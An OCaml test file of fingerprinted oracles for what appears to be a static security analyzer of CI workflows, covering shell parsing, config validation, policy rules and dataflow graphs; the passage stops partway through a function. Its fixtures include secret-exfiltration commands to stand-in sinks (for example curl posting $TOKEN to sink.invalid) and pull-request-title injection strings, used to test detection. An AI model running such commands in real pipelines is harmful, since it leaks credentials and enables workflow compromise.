exception Oracle_failed of string

let failures = ref []

let record_failure format =
  Printf.ksprintf (fun message -> failures := message :: !failures) format

let fingerprint name expected value =
  let actual = Json.to_string value |> Sha256.digest_string in
  Printf.printf "mutation oracle %s: %s\n%!" name actual;
  if actual <> expected then
    record_failure "%s fingerprint changed: expected %s, found %s" name expected
      actual

let strings values =
  Json.Array (List.map (fun value -> Json.String value) values)

let script_summary_json (summary : Script_adapter.summary) =
  Json.Object
    [
      ("shell", Json.String (Script_adapter.shell_name summary.shell));
      ( "tokens",
        Json.Array
          (List.map
             (fun (token : Script_adapter.token) ->
               Json.Object
                 [
                   ("quoted", Json.Bool token.quoted);
                   ("start", Json.Int token.start);
                   ("stop", Json.Int token.stop);
                   ("text", Json.String token.text);
                 ])
             summary.tokens) );
      ( "capabilities",
        strings (List.map Ir.capability_name summary.capabilities) );
      ("effects", strings (List.map Ir.effect_name summary.effects));
      ("unknowns", Json.Array (List.map Unknown.to_json summary.unknowns));
      ( "expansions",
        Json.Array
          (List.map
             (fun (expansion : Script_adapter.expansion) ->
               Json.Object
                 [
                   ("quoted", Json.Bool expansion.expansion_quoted);
                   ("start", Json.Int expansion.expansion_start);
                   ("stop", Json.Int expansion.expansion_stop);
                   ("text", Json.String expansion.expansion_text);
                 ])
             summary.expansions) );
      ("unsafe_interpolation", Json.Bool summary.unsafe_interpolation);
      ("secret_to_network", Json.Bool summary.secret_to_network);
      ("secret_to_output", Json.Bool summary.secret_to_output);
    ]

let script_oracle () =
  let cases =
    [
      (Script_adapter.Posix, "printf '%s' \"$TITLE\"");
      (Posix, "echo $TITLE | tee output.txt");
      (Posix, "cat < private.txt > public.txt");
      (Posix, "curl -H \"Authorization: Bearer $TOKEN\" https://api.example");
      (Posix, "wget -O artifact.tgz https://example.invalid/a");
      (Posix, "git config credential.helper store");
      (Posix, "git push origin HEAD:main");
      (Posix, "gh release create v1 dist/app");
      (Posix, "docker login registry.example --password-stdin");
      (Posix, "kubectl apply -f deployment.yml");
      (Posix, "terraform apply -auto-approve");
      (Posix, "aws cloudformation deploy --stack-name app");
      (Posix, "cp artifact /tmp/cache && chmod 600 /tmp/cache");
      (Bash, "STAMP=$(date); printf '%s' ${TITLE}");
      (Bash, "echo '${{ secrets.TOKEN }}'");
      (Bash, "echo ${{ github.event.pull_request.title }}");
      (Bash, "printf '%s' \"$NPM_TOKEN\" > private.txt");
      (Bash, "printf '%s' \"$NPM_TOKEN\" > $DESTINATION");
      (Bash, "echo \"$PASSWORD\" | docker login --password-stdin host");
      (Bash, "false || curl https://fallback.invalid");
      (Bash, "true && rm -f scratch.tmp");
      (Bash, "python - <<'PY'\nprint('safe')\nPY");
      (PowerShell, "Write-Output $env:TITLE");
      (PowerShell, "Write-Output \"$env:TOKEN\" | Tee-Object log.txt");
      (PowerShell, "Invoke-WebRequest -Uri https://example.invalid");
      (PowerShell, "Set-Content -Path out.txt -Value $env:SECRET");
      (PowerShell, "gh api repos/o/r/releases");
      (Cmd, "echo %TITLE%");
      (Cmd, "echo !TOKEN! > output.txt");
      (Cmd, "curl.exe https://example.invalid && git push");
      (Cmd, "set TOKEN=secret & echo %TOKEN%");
      (Python, "print(os.environ['TOKEN'])");
      (Python, "requests.post(url, data=os.environ.get('TOKEN'))");
      (Python, "subprocess.run(['git', 'push'])");
      (Python, "open('artifact.bin', 'wb').write(data)");
      (Unknown_shell "fish", "curl https://example.invalid | read token");
      (Unknown_shell "nushell", "open secret.txt | http post https://sink");
    ]
  in
  Json.Array
    (List.map
       (fun (shell, source) ->
         Json.Object
           [
             ("source", Json.String source);
             ( "summary",
               script_summary_json (Script_adapter.analyze shell source) );
           ])
       cases)
  |> fingerprint "script-adapter"
       "6730432f3d2f13af4cef4d627a4c5e2788e21739f2abe696a5cb9030ae831594"

let config_result_json source =
  match Config.parse source with
  | Ok config -> Json.Object [ ("ok", Config.to_json config) ]
  | Error errors -> Json.Object [ ("errors", strings errors) ]

let full_config =
  "version = 1\n" ^ "persona = \"paranoid\" # strict gate\n"
  ^ "frontends = [\"github\", \"gitlab\", \"azure\", \"circleci\"]\n"
  ^ "offline = true\n" ^ "[resolver]\nrequire_immutable = true\n"
  ^ "allowed_sources = [\"github.com\", \"gitlab.com\"]\n"
  ^ "[sandbox]\nbackend = \"linux-native\"\n" ^ "image = \"sha256:"
  ^ String.make 64 'a' ^ "\"\n"
  ^ "network = \"deny\"\ncpu_seconds = 7\nmemory_mb = 64\n"
  ^ "processes = 8\noutput_bytes = 4096\n"
  ^ "[[allowlist]]\nkind = \"dependency\"\nvalue = \"owner/action\"\n"
  ^ "reason = \"reviewed # literal\"\n"
  ^ "[[allowlist]]\nkind = \"network_host\"\nvalue = \"example.com\"\n"
  ^ "reason = \"required API\"\n"
  ^ "[[rules]]\nid = \"ORG-ALL\"\nkind = \"forbid\"\n"
  ^ "selector.mode = \"all\"\nselector.provider = \"github\"\n"
  ^ "selector.trust = \"untrusted\"\nselector.effect = \"network\"\n"
  ^ "message = \"untrusted network\"\nseverity = \"critical\"\n"
  ^ "[[rules]]\nid = \"ORG-ANY\"\nkind = \"limit\"\nlimit = 2\n"
  ^ "selector.mode = \"any\"\nselector.capability = \"repository_write\"\n"
  ^ "selector.kind = \"command\"\nseverity = \"warning\"\n"
  ^ "[[rules]]\nid = \"ORG-NONE\"\nkind = \"require\"\n"
  ^ "selector.mode = \"none\"\nselector.mutability = \"mutable\"\n"
  ^ "severity = \"note\"\n"
  ^ "[[rules]]\nid = \"ORG-PATH\"\nkind = \"forbid_path\"\n"
  ^ "selector.path = \".github/\"\nselector.dominance = \"false\"\n"
  ^ "[[suppressions]]\nrule = \"WV-SEC-001\"\n"
  ^ "path = \".github/workflows/ci.yml\"\nreason = \"reviewed fixture\"\n"
  ^ "[[suppressions]]\nrule = \"WV-NOTE\"\nreason = \"global review\"\n"

let config_oracle () =
  let invalid =
    [
      "version = 2\n";
      "version = one\n";
      "offline = false\n";
      "offline = maybe\n";
      "persona = \"unknown\"\n";
      "frontends = [\"github\", \"github\"]\n";
      "frontends = [\"other\"]\n";
      "eval = \"danger()\"\n";
      "unknown = true\n";
      "[unknown]\nvalue = 1\n";
      "[resolver]\nrequire_immutable = false\n";
      "[resolver]\nallowed_sources = broken\n";
      "[resolver]\nunknown = true\n";
      "[resolver]\n\
       require_immutable = true\n\
       [resolver]\n\
       require_immutable = true\n";
      "[sandbox]\nbackend = \"unknown\"\n";
      "[sandbox]\nbackend = \"oci:\"\n";
      "[sandbox]\nimage = \"mutable\"\n";
      "[sandbox]\nnetwork = \"allow\"\n";
      "[sandbox]\ncpu_seconds = 0\n";
      "[sandbox]\nprocesses = nope\n";
      "[[rules]]\nid = \"X\"\nkind = \"unknown\"\n";
      "[[rules]]\nid = \"X\"\nkind = \"limit\"\nlimit = nope\n";
      "[[rules]]\nid = \"X\"\nkind = \"forbid\"\nseverity = \"fatal\"\n";
      "[[rules]]\nid = \"X\"\nkind = \"forbid\"\nselector.mode = \"xor\"\n";
      "[[rules]]\n\
       id = \"X\"\n\
       kind = \"forbid\"\n\
       selector.effect = \"teleport\"\n";
      "[[suppressions]]\nrule = \"X\"\nreason = \"\"\n";
      "[[suppressions]]\nrule = \"X\"\nreason = \"ok\"\nextra = \"bad\"\n";
      "[[allowlist]]\nkind = \"other\"\nvalue = \"x\"\nreason = \"r\"\n";
      "[[allowlist]]\nkind = \"source\"\nvalue = \"\"\nreason = \"r\"\n";
      "this is not an assignment\n";
    ]
  in
  let suppression_evidence =
    match Config.parse full_config with
    | Error _ -> Json.Bool false
    | Ok config ->
        let diagnostic file rule =
          Diagnostic.make ~rule_id:rule ~severity:Diagnostic.Warning
            ~confidence:Diagnostic.Medium ~message:"fixture"
            ~span:
              (Span.make ~file (Span.position ~byte:0 ())
                 (Span.position ~byte:1 ()))
            ()
        in
        Json.Array
          [
            Json.Bool
              (Config.suppressed config
                 (diagnostic ".github/workflows/ci.yml" "WV-SEC-001"));
            Json.Bool
              (Config.suppressed config
                 (diagnostic ".github/workflows/other.yml" "WV-SEC-001"));
            Json.Bool
              (Config.suppressed config (diagnostic "any.yml" "WV-NOTE"));
          ]
  in
  Json.Object
    [
      ("default", Config.to_json Config.default);
      ("full", config_result_json full_config);
      ("invalid", Json.Array (List.map config_result_json invalid));
      ("suppressed", suppression_evidence);
    ]
  |> fingerprint "config"
       "4856d1b02ac8e29e9d01890c5d97d3f4c3716c525c27648a08b62907b0aec728"

let position index =
  Span.position ~byte:(index * 3) ~line:(index + 1) ~column:2 ()

let span index file = Span.make ~file (position index) (position (index + 1))

let value ?(trust = Abstract_value.Trusted) ?(secrecy = Abstract_value.Public)
    index text =
  Abstract_value.string_constant text ~trust ~secrecy
    ~provenance:
      [
        {
          Abstract_value.origin = "oracle";
          operation = "fixture";
          span = span index "oracle.yml";
        };
      ]

let node ?(provider = Ir.Github) ?(kind = Ir.Command) ?(phase = Ir.Run)
    ?(condition = Condition.true_) ?(attributes = []) ?(capabilities = [])
    ?(effects = []) ?unknown index name =
  Ir.make_node ~provider ~kind ~name ~phase ~span:(span index "oracle.yml")
    ~condition ~attributes ~capabilities ~effects ?unknown ()

let edge ?(kind = Ir.Control) ?(condition = Condition.true_) ?label
    (source : Ir.node) (target : Ir.node) =
  Ir.make_edge ~kind ~from_:source.Ir.id ~to_:target.Ir.id ~condition ?label ()

let graph ?(provider = Ir.Github) ?(source = "oracle.yml") nodes edges entries =
  List.fold_left
    (fun state item -> Ir.add_node item state)
    (Ir.empty provider source) nodes
  |> fun state ->
  List.fold_left (fun state item -> Ir.add_edge item state) state edges
  |> fun state ->
  List.fold_left
    (fun state (entry : Ir.node) -> Ir.add_entrypoint entry.id state)
    state entries
  |> Ir.finalize

let all_capabilities =
  [
    Ir.Repository_read;
    Repository_write;
    Token_read;
    Token_write;
    Oidc;
    Cloud_credential;
    Secret_access;
    Network;
    Filesystem_read;
    Filesystem_write;
    Shell;
    Artifact_read;
    Artifact_write;
    Cache_read;
    Cache_write;
    Deployment;
    Self_hosted_persistence;
    Ai_tool;
  ]

let all_effects =
  [
    Ir.Repository_change;
    Network_request;
    File_read;
    File_write;
    Command_execution;
    Artifact_publish;
    Cache_publish;
    Deployment_change;
    Credential_use;
    Workflow_change;
    Ai_agent_execution;
  ]

let semantic_graph () =
  let entry =
    node ~kind:Ir.Workflow ~phase:Ir.Compile
      ~capabilities:[ Ir.Repository_write; Token_write; Oidc ]
      0 "workflow"
  and untrusted =
    node ~kind:Ir.Resource
      ~attributes:
        [ ("value", value ~trust:Abstract_value.Untrusted 1 "pull request") ]
      1 "event:pull_request"
  and secret =
    node ~kind:Ir.Resource
      ~attributes:[ ("value", value ~secrecy:Abstract_value.Secret 2 "TOKEN") ]
      2 "secret:TOKEN"
  and gate =
    node ~kind:Ir.Gate ~phase:Ir.Plan
      ~condition:(Condition.atom "github.ref_protected")
      ~attributes:[ ("mechanism", value 3 "approval") ]
      3 "environment approval"
  and unsafe =
    node
      ~attributes:
        [
          ( "command",
            value ~trust:Abstract_value.Untrusted 4
              "echo ${{ github.event.pull_request.title }}" );
        ]
      ~capabilities:[ Ir.Shell ] 4 "echo $TITLE"
  and exfil =
    node
      ~attributes:
        [
          ( "command",
            value ~secrecy:Abstract_value.Secret 5
              "curl -d \"$TOKEN\" https://sink.invalid" );
        ]
      ~capabilities:[ Ir.Shell; Network; Secret_access ]
      5 "curl secret"
  and artifact =
    node ~kind:Ir.Resource
      ~capabilities:[ Ir.Artifact_read; Artifact_write ]
      6 "artifact:bundle"
  and cache =
    node ~kind:Ir.Resource
      ~capabilities:[ Ir.Cache_read; Cache_write ]
      7 "cache:dependencies"
  and checkout =
    node ~kind:Ir.Call
      ~attributes:
        [
          ("ref", value ~trust:Abstract_value.Untrusted 8 "feature");
          ("persist-credentials", value 8 "true");
        ]
      ~capabilities:[ Ir.Network; Self_hosted_persistence ]
      8 "actions/checkout@v4"
  and credential =
    node ~kind:Ir.Call
      ~attributes:
        [ ("credential", value ~secrecy:Abstract_value.Secret 9 "TOKEN") ]
      ~capabilities:[ Ir.Secret_access; Self_hosted_persistence ]
      9 "credential helper"
  and agent =
    node ~kind:Ir.Call
      ~attributes:
        [ ("prompt", value ~trust:Abstract_value.Untrusted 10 "issue body") ]
      ~capabilities:[ Ir.Network; Ai_tool ] ~effects:[ Ir.Ai_agent_execution ]
      10 "openai agent-action"
  and deploy =
    node ~capabilities:[ Ir.Shell; Deployment ]
      ~effects:[ Ir.Deployment_change ] 11 "kubectl apply -f deployment.yml"
  and self_modify =
    node
      ~capabilities:[ Ir.Shell; Filesystem_write ]
      12 "git add .github/workflows/ci.yml && git push"
  and immutable = node ~kind:Ir.Call 13 ("owner/action@" ^ String.make 40 'a')
  and digest_call =
    node ~kind:Ir.Call
      ~attributes:
        [ ("dependency.digest", value 14 ("sha256:" ^ String.make 64 'b')) ]
      14 "registry/action@stable"
  and unknown =
    node ~kind:Ir.Opaque
      ~unknown:(Unknown.Unsupported_syntax "dynamic provider expression") 15
      "dynamic"
  in
  graph
    [
      entry;
      untrusted;
      secret;
      gate;
      unsafe;
      exfil;
      artifact;
      cache;
      checkout;
      credential;
      agent;
      deploy;
      self_modify;
      immutable;
      digest_call;
      unknown;
    ]
    [
      edge entry gate;
      edge gate deploy;
      edge entry unsafe;
      edge entry exfil;
      edge entry self_modify;
      edge ~kind:Ir.Data untrusted unsafe;
      edge ~kind:Ir.Data secret exfil;
      edge ~kind:Ir.Write untrusted artifact;
      edge ~kind:Ir.Persist artifact deploy;
      edge ~kind:Ir.Write untrusted cache;
      edge ~kind:Ir.Read cache deploy;
      edge ~kind:Ir.Data untrusted checkout;
      edge ~kind:Ir.Call_edge checkout deploy;
      edge ~kind:Ir.Data secret credential;
      edge ~kind:Ir.Persist credential self_modify;
      edge ~kind:Ir.Data untrusted agent;
      edge ~kind:Ir.Call_edge agent self_modify;
      edge entry immutable;
      edge entry digest_call;
    ]
    [ entry ]

let bypass_graph () =
  let entry = node ~kind:Ir.Workflow ~phase:Ir.Compile 30 "bypass workflow"
  and gate = node ~kind:Ir.Gate ~phase:Ir.Plan 31 "environment approval"
  and deploy =
    node ~kind:Ir.Effect
      ~effects:[ Ir.Repository_change; Deployment_change ]
      ~capabilities:[ Ir.Repository_write; Deployment ]
      32 "release"
  in
  graph [ entry; gate; deploy ]
    [ edge entry gate; edge gate deploy; edge entry deploy ]
    [ entry ]

let cyclic_graph () =
  let first = node ~kind:Ir.Call 40 "first"
  and second = node ~kind:Ir.Call 41 "second"
  and third = node ~kind:Ir.Step 42 "third" in
  graph [ first; second; third ]
    [
      edge ~kind:Ir.Call_edge first second;
      edge ~kind:Ir.Call_edge second first;
      edge first third;
      edge third first;
    ]
    [ first ]

let path_json = function
  | None -> Json.Null
  | Some nodes -> strings (List.map (fun (item : Ir.node) -> item.name) nodes)

let demand_json ((owner, capability), demand) =
  Json.Object
    [
      ("owner", Json.String owner.Ir.name);
      ("capability", Json.String (Ir.capability_name capability));
      ( "demand",
        match demand with
        | Capability_analysis.Required -> Json.String "required"
        | Excessive -> Json.String "excessive"
        | Unknown reasons -> Json.Array (List.map Unknown.to_json reasons) );
    ]

let policy_assignment_json index (key, value) =
  match Policy.predicate_of_assignment key value with
  | Error message ->
      Json.Object
        [
          ("key", Json.String key);
          ("value", Json.String value);
          ("error", Json.String message);
        ]
  | Ok predicate ->
      Policy.rule_to_json
        {
          Policy.id = Printf.sprintf "P-%03d" index;
          kind = Forbid;
          selector = All [ predicate ];
          message = key ^ "=" ^ value;
          severity = Diagnostic.Warning;
        }

let semantic_oracle () =
  let graph = semantic_graph ()
  and bypass = bypass_graph ()
  and cyclic = cyclic_graph () in
  let assignments =
    [
      ("provider", "github");
      ("provider", "gitlab");
      ("provider", "azure");
      ("provider", "circleci");
      ("kind", "trigger");
      ("kind", "parameter");
      ("kind", "workflow");
      ("kind", "stage");
      ("kind", "job");
      ("kind", "step");
      ("kind", "call");
      ("kind", "command");
      ("kind", "gate");
      ("kind", "resource");
      ("kind", "effect");
      ("kind", "opaque");
      ("path", ".github/");
      ("trust", "trusted");
      ("trust", "untrusted");
      ("trust", "mixed");
      ("trust", "unknown");
      ("effect", "repository_change");
      ("effect", "network_request");
      ("effect", "file_read");
      ("effect", "file_write");
      ("effect", "command_execution");
      ("effect", "artifact_publish");
      ("effect", "cache_publish");
      ("effect", "deployment_change");
      ("effect", "credential_use");
      ("effect", "workflow_change");
      ("effect", "ai_agent_execution");
    ]
    @ List.map
        (fun value -> ("capability", Ir.capability_name value))
        all_capabilities
    @ [
        ("mutability", "immutable");
        ("mutability", "mutable");
        ("mutability", "local");
        ("mutability", "unknown");
        ("dominance", "true");
        ("dominance", "false");
        ("provider", "invalid");
        ("kind", "invalid");
        ("trust", "invalid");
        ("effect", "invalid");
        ("capability", "invalid");
        ("mutability", "invalid");
        ("dominance", "invalid");
        ("unknown", "value");
      ]
  in
  let policy_rules =
    [
      {
        Policy.id = "ORACLE-FORBID";
        kind = Forbid;
        selector = Any [ Capability Ir.Network; Effect Ir.Workflow_change ];
        message = "network or workflow change";
        severity = Diagnostic.Critical;
      };
      {
        Policy.id = "ORACLE-REQUIRE";
        kind = Require;
        selector = All [ Provider Ir.Gitlab; Node_kind Ir.Trigger ];
        message = "gitlab trigger required";
        severity = Diagnostic.Error;
      };
      {
        Policy.id = "ORACLE-LIMIT";
        kind = Limit 2;
        selector = None_of [ Trust Policy.Trusted ];
        message = "untrusted surface limited";
        severity = Diagnostic.Warning;
      };
      {
        Policy.id = "ORACLE-PATH";
        kind = Forbid_path;
        selector = All [ Effect Ir.Deployment_change; Dominated_by_gate true ];
        message = "tainted deployment path";
        severity = Diagnostic.Note;
      };
    ]
  in
  let solution = Dataflow.solve graph in
  let first = List.hd graph.Ir.nodes
  and last = List.hd (List.rev graph.nodes) in
  let graph_facts =
    Json.Object
      [
        ("graph", Ir.to_json graph);
        ("bypass", Ir.to_json bypass);
        ("cyclic", Ir.to_json cyclic);
        ("dataflow_complete", Json.Bool solution.complete);
        ( "dataflow",
          Json.Array
            (List.map
               (fun (item : Ir.node) ->
                 Json.Object
                   [
                     ("node", Json.String item.name);
                     ( "value",
                       Abstract_value.to_json
                         (Dataflow.value_at solution item.id) );
                   ])
               graph.nodes) );
        ( "shortest",
          path_json (Graph_algorithms.shortest_path graph first.id last.id) );
        ( "shortest_without_gate",
          path_json
            (Graph_algorithms.shortest_path ~avoid:[ first.id ] graph first.id
               last.id) );
        ( "control_cycles",
          Json.Array (List.map strings (Graph_algorithms.control_cycles cyclic))
        );
        ( "call_cycles",
          Json.Array
            (List.map strings
               (Graph_algorithms.cycles ~edge_kinds:[ Ir.Call_edge ] cyclic)) );
        ( "dominance",
          Json.Array
            [
              Json.Bool
                (Graph_algorithms.dominates bypass
                   ~dominator:(List.nth bypass.nodes 0).id
                   ~node:(List.nth bypass.nodes 2).id);
              Json.Bool
                (Graph_algorithms.dominates bypass
                   ~dominator:(List.nth bypass.nodes 1).id
                   ~node:(List.nth bypass.nodes 2).id);
            ] );
        ( "grant_demands",
          Json.Array
            (List.map demand_json (Capability_analysis.grant_demands graph)) );
        ( "minimal_capabilities",
          strings
            (Graph_algorithms.shortest_path graph first.id last.id
            |> Option.value ~default:[] |> Capability_analysis.minimal_for_path
            |> List.map Ir.capability_name) );
      ]
  in
  let verifier =
    Json.Array
      (List.concat_map
         (fun candidate ->
           List.map
             (fun persona ->
               let result = Verifier.verify ~persona candidate in
               Json.Object
                 [
                   ("persona", Json.String (Verifier.persona_name persona));
                   ("result", Verifier.to_json result);
                   ( "should_fail",
                     Json.Bool (Verifier.should_fail persona result) );
                 ])
             [ Verifier.Gate; Audit; Paranoid ])
         [ graph; bypass; cyclic; Ir.empty Ir.Github "empty.yml" ])
  in
  let policy =
    Json.Object
      [
        ( "assignments",
          Json.Array (List.mapi policy_assignment_json assignments) );
        ("rules", Json.Array (List.map Policy.rule_to_json policy_rules));
        ( "diagnostics",
          Json.Array
            (List.map Diagnostic.to_json (Policy.evaluate policy_rules graph))
        );
      ]
  in
  let program = Program_graph.compose [ graph; bypass ] |> Ir.to_json in
  Json.Object
    [
      ( "enum_capabilities",
        strings (List.map Ir.capability_name all_capabilities) );
      ("enum_effects", strings (List.map Ir.effect_name all_effects));
      ("graph_facts", graph_facts);
      ("policy", policy);
      ("program", program);
      ("verifier", verifier);
    ]
  |> fingerprint "semantic-core"
       "8c013588d3dc61c0f9169463aa6c6bcbd45a207f11f8771958610a583606bff8"

let abstract_string value =
  {
    Abstract_value.value_type = String_type;
    value = String value;
    trust = Trusted;
    secrecy = Public;
    provenance = [];
  }

let abstract_edge_evidence () =
  let prefix =
    Abstract_value.join
      (abstract_string (Affix { prefix = Some "identical"; suffix = None }))
      (abstract_string (Constants [ "identical" ]))
  and suffix =
    Abstract_value.join
      (abstract_string (Affix { prefix = None; suffix = Some "same-ending" }))
      (abstract_string (Constants [ "same-ending" ]))
  and list_value =
    {
      Abstract_value.value_type = List_type;
      value = List None;
      trust = Trusted;
      secrecy = Public;
      provenance = [];
    }
  in
  Json.Object
    [
      ("identical_prefix", Abstract_value.to_json prefix);
      ("identical_suffix", Abstract_value.to_json suffix);
      ("list_type", Abstract_value.to_json list_value);
    ]

let policy_edge_evidence () =
  let calls =
    [
      node ~kind:Ir.Call 100 ("registry/image@sha256:" ^ String.make 64 'a');
      node ~kind:Ir.Call 101 ("owner/action@" ^ String.make 40 'b');
      node ~kind:Ir.Call 102 "owner/action@v1";
      node ~kind:Ir.Call 103 "./local/action";
      node ~kind:Ir.Call 104 "dynamic-call";
      node ~kind:Ir.Command 105 ("owner/action@" ^ String.make 40 'c');
    ]
  in
  let graph = graph calls [] [] in
  let predicates =
    [
      ("immutable", Policy.Dependency_mutability Frontend_intf.Immutable);
      ("mutable", Policy.Dependency_mutability Frontend_intf.Mutable);
      ("local", Policy.Dependency_mutability Frontend_intf.Local);
      ("unknown", Policy.Dependency_mutability Frontend_intf.Unknown_mutability);
    ]
  in
  Json.Array
    (List.map
       (fun (label, predicate) ->
         let rule =
           {
             Policy.id = "EDGE-" ^ String.uppercase_ascii label;
             kind = Forbid;
             selector = All [ predicate ];
             message = label;
             severity = Diagnostic.Warning;
           }
         in
         Json.Object
           [
             ("label", Json.String label);
             ( "diagnostics",
               Json.Array
                 (List.map Diagnostic.to_json (Policy.evaluate [ rule ] graph))
             );
           ])
       predicates)

let verifier_result graph = Verifier.verify ~persona:Verifier.Audit graph

let permission_edge_graph () =
  let entry = node ~kind:Ir.Workflow ~phase:Ir.Compile 110 "grant workflow"
  and holder =
    node ~kind:Ir.Command ~capabilities:[ Ir.Repository_write ] 111
      "grant-only command"
  in
  graph [ entry; holder ] [ edge ~kind:Ir.Grant entry holder ] [ entry ]

let safe_checkout_graph () =
  let entry =
    node ~kind:Ir.Workflow ~phase:Ir.Compile 120 "safe checkout workflow"
  and source =
    node ~kind:Ir.Resource
      ~attributes:
        [ ("value", value ~trust:Abstract_value.Untrusted 121 "head ref") ]
      121 "event:head"
  and checkout =
    node ~kind:Ir.Call 122 ("actions/checkout@" ^ String.make 40 'd')
  and sink =
    node ~kind:Ir.Effect ~capabilities:[ Ir.Repository_write ]
      ~effects:[ Ir.Repository_change ] 123 "publish"
  in
  graph
    [ entry; source; checkout; sink ]
    [
      edge entry checkout;
      edge checkout sink;
      edge ~kind:Ir.Data source checkout;
    ]
    [ entry ]

let mechanism_gate_graph () =
  let entry = node ~kind:Ir.Workflow ~phase:Ir.Compile 130 "manual workflow"
  and gate =
    node ~kind:Ir.Gate ~phase:Ir.Plan
      ~attributes:[ ("mechanism", value 131 "manual") ]
      131 "custom human review"
  and sink =
    node ~kind:Ir.Effect ~capabilities:[ Ir.Deployment ]
      ~effects:[ Ir.Deployment_change ] 132 "deploy"
  in
  graph [ entry; gate; sink ] [ edge entry gate; edge gate sink ] [ entry ]

let non_authorizing_mechanism_graph () =
  let entry = node ~kind:Ir.Workflow ~phase:Ir.Compile 135 "review workflow"
  and gate =
    node ~kind:Ir.Gate ~phase:Ir.Plan
      ~attributes:[ ("mechanism", value 136 "review") ]
      136 "custom review label"
  and sink =
    node ~kind:Ir.Effect ~capabilities:[ Ir.Deployment ]
      ~effects:[ Ir.Deployment_change ] 137 "deploy after weak label"
  in
  graph [ entry; gate; sink ] [ edge entry gate; edge gate sink ] [ entry ]

let misleading_environment_graph () =
  let entry =
    node ~kind:Ir.Workflow ~phase:Ir.Compile 140 "environment workflow"
  and disconnected_environment =
    node ~kind:Ir.Resource 141 "environment:production"
  and connected_resource = node ~kind:Ir.Resource 142 "resource:unprotected"
  and sink =
    node ~kind:Ir.Effect ~capabilities:[ Ir.Deployment ]
      ~effects:[ Ir.Deployment_change ] 143 "deploy without gate"
  in
  graph
    [ entry; disconnected_environment; connected_resource; sink ]
    [ edge entry sink; edge ~kind:Ir.Grant connected_resource sink ]
    [ entry ]

let marker_only_agent_graph () =
  let entry = node ~kind:Ir.Workflow ~phase:Ir.Compile 150 "agent workflow"
  and source =
    node ~kind:Ir.Resource
      ~attributes:
        [ ("value", value ~trust:Abstract_value.Untrusted 151 "issue body") ]
      151 "event:issue"
  and agent =
    node ~kind:Ir.Call ~capabilities:[ Ir.Network ] 152 "claude-code bridge"
  in
  graph [ entry; source; agent ]
    [ edge entry agent; edge ~kind:Ir.Data source agent ]
    [ entry ]

let synthetic_should_fail_evidence () =
  let diagnostic severity confidence =
    Diagnostic.make ~rule_id:"EDGE-GATE" ~severity ~confidence ~message:"edge"
      ~span:Span.none ()
  and unknown_property =
    {
      Property.id = "EDGE-UNKNOWN";
      state = Unknown [ Unknown.External_state "fixture" ];
      subject = None;
      explanation = "fixture";
    }
  in
  let result diagnostics properties : Verifier.result =
    {
      diagnostics;
      properties;
      complete = false;
      analyzed_nodes = 0;
      analyzed_edges = 0;
    }
  in
  let candidates =
    [
      ("high-warning", result [ diagnostic Warning High ] []);
      ("medium-critical", result [ diagnostic Critical Medium ] []);
      ("high-error", result [ diagnostic Error High ] []);
      ("unknown-only", result [] [ unknown_property ]);
    ]
  in
  Json.Array
    (List.map
       (fun (label, candidate) ->
         Json.Object
           [
             ("label", Json.String label);
             ("gate", Json.Bool (Verifier.should_fail Gate candidate));
             ("audit", Json.Bool (Verifier.should_fail Audit candidate));
             ("paranoid", Json.Bool (Verifier.should_fail Paranoid candidate));
           ])
       candidates)

let semantic_edge_oracle () =
  let append_redirect =
    Script_adapter.analyze Bash "printf '%s' \"$TOKEN\" >> private.log"
  in
  let graphs =
    [
      ("permission", permission_edge_graph ());
      ("safe-checkout", safe_checkout_graph ());
      ("mechanism-gate", mechanism_gate_graph ());
      ("non-authorizing-mechanism", non_authorizing_mechanism_graph ());
      ("misleading-environment", misleading_environment_graph ());
      ("marker-only-agent", marker_only_agent_graph ());
    ]
  in
  Json.Object
    [
      ("abstract", abstract_edge_evidence ());
      ("append_redirect", script_summary_json append_redirect);
      ("policy_mutability", policy_edge_evidence ());
      ( "graphs",
        Json.Array
          (List.map
             (fun (label, candidate) ->
               Json.Object
                 [
                   ("label", Json.String label);
                   ("graph", Ir.to_json candidate);
                   ("result", Verifier.to_json (verifier_result candidate));
                 ])
             graphs) );
      ("should_fail", synthetic_should_fail_evidence ());
    ]
  |> fingerprint "semantic-edges"
       "4a0f64e9bb6a11efea8694efb350a2207cc0f0001362b9a793275445be81a2b6"

let config_edge_oracle () =
  Json.Array
    (List.map config_result_json
       [
         "[sandbox]\nbackend = bare\n";
         "[sandbox]\nimage = bare\n";
         "[sandbox]\nnetwork = bare\n";
       ])
  |> fingerprint "config-edges"
       "4a271faebb8983022bbb8a30f76a3726e5a32e23827ac615a8a5938145243bce"

let yaml_newline_name = function
  | `Lf -> "lf"
  | `CrLf -> "crlf"
  | `Cr -> "cr"
  | `None -> "none"

let yaml_trivia_name = function
  | Yaml_cst.Comment -> "comment"
  | Blank -> "blank"
  | Directive -> "directive"
  | Document_start -> "document-start"
  | Document_end -> "document-end"

let yaml_problem_json (problem : Yaml_cst.problem) =
  Json.Object
    [
      ("code", Json.String problem.code);
      ("message", Json.String problem.message);
      ("span", Span.to_json problem.span);
    ]

let yaml_issue_json (issue : Yaml_validation.issue) =
  Json.Object
    [
      ("code", Json.String issue.code);
      ("message", Json.String issue.message);
      ("span", Span.to_json issue.span);
    ]

let rec yaml_layout_evidence = function
  | Yaml_cst.Scalar scalar ->
      Json.Object
        [
          ("kind", Json.String "scalar");
          ("raw", Json.String scalar.raw);
          ("span", Span.to_json scalar.span);
        ]
  | Alias alias ->
      Json.Object
        [
          ("kind", Json.String "alias");
          ("raw", Json.String alias.raw);
          ("span", Span.to_json alias.span);
        ]
  | Sequence (items, span) ->
      Json.Object
        [
          ("kind", Json.String "sequence");
          ("span", Span.to_json span);
          ( "items",
            Json.Array
              (List.map
                 (fun (item : Yaml_cst.sequence_item) ->
                   Json.Object
                     [
                       ("dash", Span.to_json item.dash_span);
                       ("span", Span.to_json item.span);
                       ("value", yaml_layout_evidence item.value);
                     ])
                 items) );
        ]
  | Mapping (entries, span) | Flow_mapping (entries, span) ->
      Json.Object
        [
          ("kind", Json.String "mapping");
          ("span", Span.to_json span);
          ( "entries",
            Json.Array
              (List.map
                 (fun (entry : Yaml_cst.mapping_entry) ->
                   Json.Object
                     [
                       ("colon", Span.to_json entry.colon_span);
                       ("span", Span.to_json entry.span);
                       ("merge", Json.Bool entry.merge);
                       ("duplicate", Json.Bool entry.duplicate);
                       ("key", yaml_layout_evidence entry.key_node);
                       ("value", yaml_layout_evidence entry.value);
                     ])
                 entries) );
        ]
  | Flow_sequence (items, span) ->
      Json.Object
        [
          ("kind", Json.String "flow-sequence");
          ("span", Span.to_json span);
